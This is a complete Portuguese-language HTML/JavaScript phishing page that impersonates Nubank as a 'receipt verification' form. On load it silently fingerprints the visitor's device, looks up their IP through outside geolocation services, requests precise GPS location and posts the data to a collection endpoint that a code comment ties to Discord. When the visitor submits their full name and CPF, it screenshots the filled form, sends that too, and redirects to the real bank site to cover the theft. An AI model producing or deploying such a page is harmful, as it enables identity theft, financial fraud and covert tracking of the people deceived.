<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nubank - Verificar Comprovante</title>
  <style>
    :root {
      --nubank-purple: #820AD1;
      --nubank-purple-dark: #6b00c0;
      --nubank-purple-light: #F3E5F5;
      --text-primary: #394355;
      --text-secondary: #626F86;
      --bg-body: #FFFFFF;
      --border-color: #C8D3E3;
      --error-color: #D93025;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--bg-body);
      color: var(--text-primary);
      display: flex;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.05);
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .header {
      background-color: var(--nubank-purple);
      padding: 24px;
      color: white;
      text-align: center;
    }
    .header h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 4px; }
    .header p { font-size: 0.9rem; opacity: 0.9; }

    .content { padding: 24px; }

    .form-group { margin-bottom: 16px; }
    .form-label {
      display: block;
      font-size: 0.85rem;
      font-weight: 500;
      margin-bottom: 6px;
      color: var(--text-primary);
    }
    .form-input {
      width: 100%;
      padding: 12px;
      border: 1px solid var(--border-color);
      border-radius: 8px;
      font-size: 1rem;
      transition: border-color 0.2s;
    }
    .form-input:focus {
      outline: none;
      border-color: var(--nubank-purple);
      box-shadow: 0 0 0 3px rgba(130, 10, 209, 0.1);
    }
    .form-input.error { border-color: var(--error-color); }

    .btn-primary {
      width: 100%;
      background-color: var(--nubank-purple);
      color: white;
      border: none;
      border-radius: 8px;
      padding: 14px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 8px;
    }
    .btn-primary:hover { background-color: var(--nubank-purple-dark); }
    .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }

    .alert {
      background-color: var(--nubank-purple-light);
      color: var(--nubank-purple);
      padding: 12px;
      border-radius: 8px;
      font-size: 0.85rem;
      margin-bottom: 16px;
    }

    .geo-status {
      text-align: center;
      margin: 10px 0;
      font-size: 0.85rem;
      color: var(--text-secondary);
    }

    .hidden { display: none !important; }

    .spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid var(--nubank-purple);
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      margin: 0 auto 8px auto;
    }
    @keyframes spin { 100% { transform: rotate(360deg); } }

    .footer-note {
      text-align: center;
      font-size: 0.75rem;
      color: var(--text-secondary);
      margin-top: 16px;
    }
  </style>
</head>
<body>

  <div class="container" id="captureArea">
    <div class="header">
      <h1>Nubank</h1>
      <p>Verificação de Comprovante</p>
    </div>

    <div class="content">
      <!-- Status de Geolocalização (Automático) -->
      <div id="geoStatus" class="geo-status">
        <div class="spinner" id="geoSpinner"></div>
        <span id="geoText">Solicitando permissão de localização...</span>
      </div>

      <div class="alert" id="geoAlert">
        📍 Para confirmar a entrega digital do comprovante, precisamos da sua localização atual.
      </div>

      <!-- Formulário de Identificação -->
      <div class="form-group">
        <label class="form-label" for="inputNome">Nome Completo</label>
        <input type="text" id="inputNome" class="form-input" placeholder="Seu nome completo" autocomplete="off">
      </div>

      <div class="form-group">
        <label class="form-label" for="inputCpf">CPF</label>
        <input type="text" id="inputCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
        <div id="cpfError" class="alert hidden" style="color: var(--error-color); background: #FDECEA;">CPF inválido. Verifique os dígitos.</div>
      </div>
      
      <button id="btnFinalizar" class="btn-primary" disabled>Gerar Comprovante</button>
      
      <p class="footer-note">Seu CPF é usado apenas para validar a titularidade da conta.</p>
    </div>
  </div>

  <!-- Biblioteca para Screenshot -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

  <script>
  (() => {
    'use strict';

    const CONFIG = {
      apiEndpoint: '/api/notificar',
      destinoFinal: 'https://nubank.com.br/'
    };

    // Estado Global
    const state = {
      cpf: '',
      nome: '',
      geo: null,
      meta: null,
      ip: null,
      screenshotData: null,
      enviadoInicial: false
    };

    const el = id => document.getElementById(id);

    // ============================================
    // 1. UTILITÁRIOS
    // ============================================
    function maskCPF(value) {
      let v = value.replace(/\D/g, '').substring(0, 11);
      if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})?/, '$1.$2.$3-$4');
      else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})?/, '$1.$2-$3');
      else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})?/, '$1.$2');
      return v;
    }

    function validarCPF(cpf) {
      cpf = cpf.replace(/\D/g, '');
      if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
      let soma = 0;
      for (let i = 1; i <= 9; i++) soma += parseInt(cpf.charAt(i - 1)) * (11 - i);
      let digito1 = 11 - (soma % 11);
      if (digito1 === 10 || digito1 === 11) digito1 = 0;
      if (digito1 !== parseInt(cpf.charAt(9))) return false;
      soma = 0;
      for (let i = 1; i <= 10; i++) soma += parseInt(cpf.charAt(i - 1)) * (12 - i);
      let digito2 = 11 - (soma % 11);
      if (digito2 === 10 || digito2 === 11) digito2 = 0;
      if (digito2 !== parseInt(cpf.charAt(10))) return false;
      return true;
    }

    // ============================================
    // 2. COLETA DE METADADOS E IP
    // ============================================
    async function coletarMetadados() {
      const meta = {
        cpuCores: navigator.hardwareConcurrency || 0,
        memoriaTotal: navigator.deviceMemory || 0,
        plataforma: navigator.platform,
        userAgent: navigator.userAgent,
        larguraTela: window.screen.width,
        alturaTela: window.screen.height,
        dpiTela: window.devicePixelRatio,
        temTouch: 'ontouchstart' in window,
        fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offsetMinutos: new Date().getTimezoneOffset(),
        idiomas: navigator.languages,
        cookies: navigator.cookieEnabled,
        plugins: navigator.plugins.length,
        gpu: null,
        fontes: [],
        bateria: null
      };

      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const info = gl.getExtension('WEBGL_debug_renderer_info');
          meta.gpu = {
            vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
            renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
          };
        }
      } catch (e) {}

      const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
      const corpo = document.body;
      const testeLargura = (fonte) => {
          const span = document.createElement('span');
          span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
          span.textContent = 'mmmmmmmmmmlliillii';
          corpo.appendChild(span);
          const largura = span.offsetWidth;
          corpo.removeChild(span);
          return largura;
      };
      const larguraGenerica = testeLargura('sans-serif');
      fontes.forEach(f => {
          if (testeLargura(f) !== larguraGenerica) meta.fontes.push(f);
      });

      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          meta.bateria = { nivel: bat.level, carregando: bat.charging };
        } catch (e) {}
      }
      return meta;
    }

    async function obterIP() {
      const provedores = [
        'https://ipwho.is/',
        'https://ipapi.co/json/',
        'https://get.geojs.io/v1/ip/geo.json'
      ];
      for (const url of provedores) {
        try {
          const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
          const data = await res.json();
          return {
            ip: data.ip,
            cidade: data.city,
            regiao: data.region,
            pais: data.country,
            provedor: data.connection?.isp || data.org || data.organization,
            latitude: data.latitude,
            longitude: data.longitude,
            asn: data.connection?.asn || data.asn
          };
        } catch (e) {}
      }
      return null;
    }

    // ============================================
    // 3. ENVIO DE DADOS
    // ============================================
    async function enviarDados(incluiPessoal = false) {
      const payload = {
        autorizouCompartilhamento: true,
        dados: {
          cpf: incluiPessoal ? state.cpf : null,
          nome: incluiPessoal ? state.nome : null,
          lat: state.geo?.lat || state.ip?.latitude,
          lon: state.geo?.lon || state.ip?.longitude,
          accuracy: state.geo?.accuracy || null,
          usadoGps: !!state.geo,
          ip: state.ip?.ip,
          cidade: state.ip?.cidade,
          regiao: state.ip?.regiao,
          pais: state.ip?.pais,
          provedor: state.ip?.provedor,
          asn: state.ip?.asn,
          meta: state.meta,
          screenshot: incluiPessoal ? state.screenshotData : null,
          horario: new Date().toISOString(),
          tipoEvento: incluiPessoal ? 'final' : 'initial'
        }
      };

      try {
        const response = await fetch(CONFIG.apiEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        console.log('[DEBUG] Dados enviados:', result);
        return result;
      } catch (error) {
        console.error('[DEBUG] Falha no envio:', error);
        throw error;
      }
    }

    async function capturarScreenshot() {
      try {
        const area = document.getElementById('captureArea');
        if (window.html2canvas) {
          const canvas = await html2canvas(area, { scale: 1.5, useCORS: true, logging: false });
          return canvas.toDataURL('image/png');
        }
        return null;
      } catch (e) {
        console.warn('Falha no screenshot:', e);
        return null;
      }
    }

    // ============================================
    // 4. LÓGICA PRINCIPAL (AUTOMÁTICA)
    // ============================================
    async function inicializarColeta() {
      console.log('[DEBUG] Inicializando coleta automática...');
      
      // 1. Coleta Metadados e IP em paralelo
      const [meta, ip] = await Promise.all([coletarMetadados(), obterIP()]);
      state.meta = meta;
      state.ip = ip;

      // 2. Dispara Geolocalização (Popup Nativo)
      solicitarGeolocalizacao();

      // 3. Envia os dados iniciais (Sem CPF/Nome)
      // Isso garante que o Discord receba o IP e Hardware imediatamente
      await enviarDados(false);
      state.enviadoInicial = true;
      
      console.log('[DEBUG] Coleta inicial concluída.');
    }

    function solicitarGeolocalizacao() {
      if (!navigator.geolocation) {
        atualizarStatusGeo('erro', 'Geolocalização não suportada.');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          state.geo = {
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp
          };
          console.log('[DEBUG] GPS Obtido:', state.geo);
          atualizarStatusGeo('sucesso', `Localização obtida (±${Math.round(state.geo.accuracy)}m).`);
        },
        (error) => {
          console.warn('[DEBUG] Erro de Geolocalização:', error.message);
          atualizarStatusGeo('erro', 'Localização não autorizada.');
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    function atualizarStatusGeo(tipo, texto) {
      el('geoSpinner').classList.add('hidden');
      el('geoText').textContent = texto;
      if (tipo === 'erro') {
        el('geoAlert').style.display = 'none';
      } else {
        // Se for sucesso, podemos esconder o alerta de solicitação
        el('geoAlert').style.display = 'none';
      }
    }

    // ============================================
    // 5. EVENTOS DO FORMULÁRIO (CPF E NOME)
    // ============================================

    // Máscara e Validação de CPF
    el('inputCpf').addEventListener('input', (e) => {
      e.target.value = maskCPF(e.target.value);
      const cpfLimpo = e.target.value.replace(/\D/g, '');
      
      if (cpfLimpo.length === 11) {
        if (validarCPF(cpfLimpo)) {
          state.cpf = e.target.value;
          el('cpfError').classList.add('hidden');
          verificarFormularioCompleto();
        } else {
          el('cpfError').classList.remove('hidden');
          state.cpf = '';
          el('btnFinalizar').disabled = true;
        }
      } else {
        state.cpf = '';
        el('btnFinalizar').disabled = true;
      }
    });

    // Captura do Nome
    el('inputNome').addEventListener('input', (e) => {
      state.nome = e.target.value.trim();
      verificarFormularioCompleto();
    });

    // Habilita o botão apenas se Nome e CPF forem válidos
    function verificarFormularioCompleto() {
      if (state.nome.length > 3 && validarCPF(state.cpf)) {
        el('btnFinalizar').disabled = false;
      } else {
        el('btnFinalizar').disabled = true;
      }
    }

    // AÇÃO FINAL: Gerar Comprovante (Envio de Dados Pessoais + Screenshot)
    el('btnFinalizar').addEventListener('click', async () => {
      const botao = el('btnFinalizar');
      botao.disabled = true;
      botao.textContent = 'Processando...';

      try {
        // 1. Captura o Screenshot da tela (com CPF e Nome preenchidos)
        state.screenshotData = await capturarScreenshot();

        // 2. Envia os dados finais (Incluindo CPF, Nome e Screenshot)
        await enviarDados(true);

        // 3. Redireciona para o site real do Nubank
        window.location.href = CONFIG.destinoFinal;

      } catch (error) {
        console.error('[DEBUG] Erro no envio final:', error);
        botao.textContent = 'Erro ao processar. Tente novamente.';
        botao.disabled = false;
      }
    });

    // ============================================
    // 6. INICIALIZAÇÃO AUTOMÁTICA
    // ============================================
    document.addEventListener('DOMContentLoaded', () => {
      // Dispara a coleta assim que a página carregar
      inicializarColeta();
    });

  })();
  </script>
</body>
</html>
